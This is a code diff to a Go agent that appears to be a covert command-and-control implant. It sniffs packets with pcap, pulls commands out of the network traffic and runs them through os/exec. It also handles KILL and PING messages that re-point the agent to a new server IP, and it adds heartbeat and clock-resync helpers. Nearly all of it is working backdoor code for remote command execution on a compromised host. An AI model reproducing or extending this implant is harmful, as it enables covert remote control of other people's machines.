@@ -4,10 +4,9 @@ import (
 	"bytes"
 	"fmt"
 	"log"
+	"mesa/goclient/pkg/agent"
 	"os/exec"
 	"strings"
-
-	"mesa/goclient/pkg/agent"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/pcap"
@@ -16,6 +15,7 @@ import (
 func StartSniffer(newAgent agent.Agent) {
 	msg := ""
 	for {
+
 		var (
 			iface  = newAgent.IFace
 			buffer = int32(1600)
@@ -46,11 +46,19 @@ func StartSniffer(newAgent agent.Agent) {
 				runCommand(msg, newAgent)
 				msg = ""
 			} else if cont == "KILL" {
-				//start shutdown
+				//TODO add start shutdown
 			} else if cont == "PING" { //resync
-				newAgent.ServerIP = []byte(ret)
-				fmt.Println("serverip: ", newAgent.ServerIP)
-				//fmt.Println(newAgent.ServerIP)
+				fmt.Println(string(newAgent.ServerIP))
+				fmt.Println(ret)
+				if ret != string(newAgent.ServerIP) { //solves DHCP issue
+					newAgent.ServerIP = []byte(ret)
+					agent.Setup(newAgent)
+				} else {
+					Resync(newAgent)
+				}
+
+				fmt.Println("ping. serverip: ", newAgent.ServerIP)
+
 			} else {
 				continue
 			}
@@ -93,7 +101,7 @@ func runCommand(msg string, newAgent agent.Agent) {
 	fmt.Println(string(output))
 }
 
-func resync(newAgent agent.Agent) {
+func Resync(newAgent agent.Agent) {
 	var command string
 	if newAgent.OpSys == "Windows" {
 		command = "w32tm /resync"
@@ -109,13 +117,20 @@ func resync(newAgent agent.Agent) {
 	}
 
 	fmt.Println(string(output))
-	}
 }
 
 func decode(content []byte) string {
 	content = bytes.Trim(content, "\x00")
 	return string(content)
 	//TODO fix later with single XOR byte
+}
+
+func Heartbeat(newAgent agent.Agent) {
+	if newAgent.OpSys == "Windows" {
+		runCommand("w32tm /resync", newAgent)
+	} else {
+		runCommand("echo yeah ill add this funct eventually", newAgent) //TODO actual linux command
+	}
 }
 
 //encode/decode/craft packets
